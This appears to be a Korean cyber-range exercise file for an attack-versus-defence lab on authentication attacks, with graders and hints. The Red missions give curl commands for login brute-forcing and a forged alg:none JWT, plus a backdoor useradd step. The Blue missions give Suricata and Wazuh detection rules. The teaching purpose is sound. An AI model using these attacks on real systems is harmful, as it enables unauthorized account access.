id: "attack-adv-w05"
category: "attack-adv"
title: "[공격고급 W5] 인증 공격 — 브루트포스/JWT 변조 vs 인증 이상 탐지"
difficulty: "hard"
time_limit: 3000
battle_type: "1v1"
description: |
  공격 고급과정 5주차 — **인증 공격**. 브루트포스·패스워드 스프레이·해시 크래킹·JWT 변조·세션 공격을 다룬다.
  (6v6 에는 AD/Kerberos 가 없으므로 Kerberos/NTLM 개념은 **웹 인증 브루트포스·JWT·SSH 인증**으로 치환해
  실습한다.) Red 는 인증을 공략하고, Blue 는 인증 이상을 탐지한다.

  ▸ 이야기
    공격자가 로그인 브루트포스/패스워드 스프레이를 퍼붓고, JWT 의 `alg:none` 변조를 시도하며, 탈취 크리덴셜로
    백도어 계정을 만든다. 방어자는 인증 실패 빈도와 토큰 변조를 탐지한다.

  ▸ 모드
    • solo : 한 학생이 인증 공격(자기 인프라 표적)과 탐지를 모두. 대상 = 본인 인프라.
    • duel : Red 가 상대(Blue) 인프라를 공격, Blue 는 자기 인프라에서 탐지.

  ▸ 공격자 위치(중요)
    Red 미션은 **attacker-ext(SSH 2203)** 기준. Red 채점은 **대상 인프라의 흔적(WAF audit 태그 / 크리덴셜 파일·계정)** 으로 한다.

  ▸ 이번 주차 전용 마커
    공격 태그 **`aa05r1-<본인id>`**, 탈취 크리덴셜 파일 **`/tmp/.aa05creds`**(마커 `aa05`), 계정 **`atka05`**,
    Suricata 탐지 **sid 9705011**, Wazuh 탐지 **id 103051**. 종료 시 cleanup.

red_missions:
  - order: 1
    assess_target: opponent
    target_vm: web
    points: 22
    instruction: |
      ## 🎯 RED-1 [브루트포스/JWT] — 로그인 폭주 + 토큰 변조

      ### 상황
      너는 웹 로그인에 브루트포스/패스워드 스프레이를 반복하고(태그 `aa05r1-<본인id>`), JWT 의 `alg:none` 변조를
      시도한다. 반복 인증 시도는 대상 audit/로그에 태그와 함께 남는다.

      ### 할 일 (attacker-ext)
      예시(id=kim) — 로그인 브루트포스(태그 UA):
      ```bash
      for pw in admin 123456 password admin123 root; do
        curl -s -A "aa05r1-kim-brute" -H "Host: dvwa.6v6.lab" \
          --data "username=admin&password=$pw&Login=Login" "http://<대상_공개IP>/login"
      done
      # JWT alg:none 변조 (개념) — 헤더를 {"alg":"none"} 로 바꾼 토큰으로 요청
      curl -s -A "aa05r1-kim-jwt" -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." \
        -H "Host: dvwa.6v6.lab" "http://<대상_공개IP>/api/profile"
      ```

      ### 채점 방법
      대상 WAF audit(modsec)에 태그 `aa05r1` 가 포함된 인증 공격 흔적이 남았는지로 채점.

      ### 합격 기준
      대상 WAF audit 에 `aa05r1` 태그가 포함된 인증 공격 흔적이 남는다.
    hint: "태그(aa05r1) 로그인 브루트포스 + JWT alg:none → 대상 modsec audit. 채점: log_contains modsec aa05r1."
    verify:
      type: "log_contains"
      expect: "aa05r1"
      checks:
        - { id: "red-1-1", type: "log_contains", target: "web",
            params: { log: "modsec", pattern: "aa05r1", since_sec: 1800 } }
      semantic:
        intent: "인증 공격 — Brute Force(T1110) + 토큰 변조(T1550). 대상 WAF audit, 태그(aa05r1) 귀속."
        success_criteria:
          - "대상 WAF audit 에 aa05r1 태그가 포함된 인증 공격 흔적"
          - "브루트포스/스프레이/JWT 변조 중 무엇을 했는지 서술"
        acceptable_methods:
          - "attacker-ext 에서 태그 단 로그인 브루트포스/JWT 변조"
        negative_signs:
          - "태그 누락 / 대상 미도달"

  - order: 2
    assess_target: opponent
    target_vm: web
    points: 18
    instruction: |
      ## 🎯 RED-2 [크리덴셜 탈취 발판] — 크랙 결과 + 백도어 계정

      ### 상황
      해시 크래킹/스프레이로 얻은 크리덴셜을 **`/tmp/.aa05creds`**(마커 `aa05`)에 저장하고, 지속성을 위해 백도어
      계정 **`atka05`** 를 만든다.

      ### 할 일
      ```bash
      printf 'aa05 cracked: admin:admin123  svc:Summer2026!' > /tmp/.aa05creds
      sudo useradd -m -s /bin/bash atka05
      ```

      ### 채점 방법
      대상 호스트에 `/tmp/.aa05creds`(마커 `aa05`)이 있거나 `/etc/passwd` 에 `atka05` 가 있는지로 채점.

      ### 합격 기준
      `/tmp/.aa05creds`(마커 `aa05`) 또는 계정 `atka05`.
    hint: "탈취 크리덴셜 /tmp/.aa05creds (마커 aa05) + useradd atka05. 채점: file_contains creds aa05 + file_contains passwd atka05."
    verify:
      type: "file_contains"
      expect: "aa05"
      checks:
        - { id: "red-2-1", type: "file_contains", target: "web",
            params: { path: "/tmp/.aa05creds", pattern: "aa05" } }
        - { id: "red-2-2", type: "file_contains", target: "web",
            params: { path: "/etc/passwd", pattern: "atka05" } }
      semantic:
        intent: "크리덴셜 탈취(T1003/T1110) + 계정(T1136) — 크랙 결과 저장 + 백도어. 인증 우회 지속성."
        success_criteria:
          - "/tmp/.aa05creds(마커 aa05) 또는 계정 atka05"
          - "크래킹/스프레이 방법과 탈취 크리덴셜 활용 서술"
        acceptable_methods:
          - "크리덴셜 파일 + useradd"
        negative_signs:
          - "흔적 미생성"

blue_missions:
  - order: 1
    assess_target: self
    target_vm: ips
    points: 20
    instruction: |
      ## 🛡️ BLUE-1 [인증 공격 탐지] — Suricata 룰 (sid 9705011)

      ### 상황
      JWT `alg:none` 변조와 로그인 폭주를 네트워크에서 잡는 Suricata 룰(**sid 9705011**)을 만든다.

      ### 할 일
      ```
      alert http any any -> any any (msg:"ATKADV-W05 JWT alg none tampering"; flow:to_server; content:"eyJhbGciOiJub25lIn0"; nocase; sid:9705011; rev:1;)
      ```
      ```bash
      sudo suricatasc -c reload-rules
      ```
      > `eyJhbGciOiJub25lIn0` 는 `{"alg":"none"}` 의 base64url 이다.

      ### 채점 방법
      ips 의 `local.rules` 에 sid 9705011 룰이 있는지로 확인.

      ### 합격 기준
      `local.rules` 에 JWT 변조를 보는 sid 9705011 룰이 존재한다.
    hint: "JWT alg:none(eyJhbGciOiJub25lIn0) Suricata 룰(sid 9705011) → reload. 채점: file_contains local.rules 9705011."
    verify:
      type: "file_contains"
      expect: "9705011"
      checks:
        - { id: "blue-1-1", type: "file_contains", target: "ips",
            params: { path: "/etc/suricata/rules/local.rules", pattern: "9705011" } }
      semantic:
        intent: "인증 공격 탐지(네트워크) — JWT alg:none 변조 시그니처 Suricata 룰. 토큰 위변조 포착."
        success_criteria:
          - "local.rules 에 sid 9705011 (alg:none base64url)"
          - "JWT alg:none 공격 원리 서술"
        acceptable_methods:
          - "Suricata 룰 작성 + reload"
        negative_signs:
          - "시그니처 부정확 / 문법 오류"

  - order: 2
    assess_target: self
    target_vm: siem
    points: 22
    instruction: |
      ## 🛡️ BLUE-2 [브루트포스 빈도 탐지] — Wazuh 룰 (id 103051)

      ### 상황
      인증 공격의 핵심 신호는 **반복 실패**다. 동일 IP 의 로그인 폭주를 잡는 Wazuh 룰(**id 103051**, frequency)을 만든다.

      ### 할 일
      ```xml
      <group name="edu,auth,">
        <rule id="103051" level="12" frequency="6" timeframe="120">
          <if_matched_group>authentication_failed</if_matched_group>
          <same_source_ip />
          <description>ATKADV-W05 - authentication brute force (repeated failures from same IP)</description>
        </rule>
      </group>
      ```
      ```bash
      sudo /var/ossec/bin/wazuh-control restart
      ```
      (인증 실패 그룹이 없으면 `<if_group>web</if_group>` + `<match>login</match>` 로 근사.)

      ### 채점 방법
      `local_rules.xml` 에 id 103051 룰이 있는지로 확인.

      ### 합격 기준
      `local_rules.xml` 에 브루트포스 빈도를 보는 id 103051 룰이 존재한다.
    hint: "브루트포스 frequency Wazuh 룰(id 103051, same_source_ip 인증실패) → restart. 채점: file_contains local_rules.xml 103051."
    verify:
      type: "file_contains"
      expect: "103051"
      checks:
        - { id: "blue-2-1", type: "file_contains", target: "siem",
            params: { path: "/var/ossec/etc/rules/local_rules.xml", pattern: "103051" } }
      semantic:
        intent: "인증 공격 탐지(빈도) — frequency 로 동일 IP 반복 인증 실패 포착. 브루트포스/스프레이의 핵심 신호."
        success_criteria:
          - "local_rules.xml 에 rule id 103051 (frequency)"
          - "반복 실패가 인증 공격 신호인 이유 서술"
        acceptable_methods:
          - "Wazuh frequency 룰 + restart"
        negative_signs:
          - "frequency 없는 단순 룰 / XML 오류"

  - order: 3
    assess_target: self
    target_vm: siem
    points: 18
    instruction: |
      ## 🛡️ BLUE-3 [인증 방어 전략] — Kerberos/NTLM/JWT/OAuth/MFA 종합

      ### 상황
      인증 공격 전반(Kerberos/NTLM/JWT/OAuth/MFA 우회)에 대한 방어 전략을 정리한다.

      ### 할 일
      보고서에:
      - 공격별 방어: 강한 PW/계정 잠금(브루트포스), 서명 검증·alg 고정(JWT), state·PKCE(OAuth), 피싱 저항 MFA
      - 탈취 크리덴셜(`/tmp/.aa05creds`)·백도어 계정(atka05) 헌팅 결과
      ```bash
      sudo tail -200 /var/ossec/logs/alerts/alerts.json | \
        python3 -c 'import sys,json;[print(json.loads(l).get("rule",{}).get("id")) for l in sys.stdin if l.strip()]' | sort | uniq -c | sort -rn | head
      ```

      ### 채점 방법
      본인 SIEM 에 최근 경보가 수집돼 있는지 + 제출한 인증 방어 전략으로 채점.

      ### 합격 기준
      본인 SIEM 에 최근 경보가 있다(+ 인증 방어 전략·헌팅은 제출로 검증).
    hint: "Kerberos/NTLM/JWT/OAuth/MFA 공격별 방어(계정잠금/서명검증/PKCE/피싱저항 MFA) + 크리덴셜/계정 헌팅. 채점: wazuh_alert + 제출."
    verify:
      type: "wazuh_alert"
      expect: "alert"
      checks:
        - { id: "blue-3-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
      semantic:
        intent: "인증 방어 전략 — 공격별 대응 + 헌팅. 분석형 — 구체 방어(서명검증/계정잠금/MFA) 제시 시 점수 상승."
        success_criteria:
          - "최근 경보 수집 확인"
          - "Kerberos/NTLM/JWT/OAuth/MFA 공격별 방어 전략"
          - "탈취 크리덴셜/계정 헌팅 결과"
        acceptable_methods:
          - "방어 전략표 + 헌팅"
        negative_signs:
          - "방어 전략 누락"
